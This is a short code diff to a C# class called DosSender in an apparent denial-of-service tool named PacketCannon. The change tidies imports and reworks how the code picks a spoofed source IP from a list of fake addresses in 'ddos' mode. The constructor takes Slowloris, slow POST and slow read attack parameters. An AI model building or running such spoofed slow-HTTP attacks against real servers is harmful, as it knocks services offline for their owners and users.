@@ -1,30 +1,32 @@
-﻿using PcapDotNet.Core;
+﻿using PcapDotNet.Base;
+using PcapDotNet.Core;
 using PcapDotNet.Packets;
+using PcapDotNet.Packets.Arp;
 using PcapDotNet.Packets.Ethernet;
 using PcapDotNet.Packets.Http;
+using PcapDotNet.Packets.Icmp;
 using PcapDotNet.Packets.IpV4;
 using PcapDotNet.Packets.Transport;
 using System;
 using System.Linq;
-using System.Net.NetworkInformation;
 using System.Text;
 using System.Text.RegularExpressions;
-using PcapDotNet.Packets.Arp;
-using PcapDotNet.Packets.Icmp;
 using static PacketCannon.SenderStatus;
 using HttpVersion = PcapDotNet.Packets.Http.HttpVersion;
-using PcapDotNet.Base;
 
 namespace PacketCannon
 {
     public class DosSender
     {
+        private static readonly Random _rand = new Random();
+
         public DosSender(IPacketDevice packetDevice, string sourceIp, string destIp, MacAddress destMac, MacAddress sourceMac, string host, string slowLorisKeepAliveData, string slowLorisHeaderNotComplete, int slowPostHeaderContentLength, string slowPostHeader, string slowReadUrl, int startPort, int portStep, bool ddos = false)
         {
             if (ddos)
             {
-                Random rand = new Random();
-                SourceIpV4 = DosController.FakeIpV4Addresses[rand.Next() % DosController.FakeIpV4Addresses.Count];
+                var randomNumber = _rand.Next() % DosController.FakeIpV4Addresses.Count;
+                Console.WriteLine(randomNumber);
+                SourceIpV4 = DosController.FakeIpV4Addresses[randomNumber];
             }
             else
             {
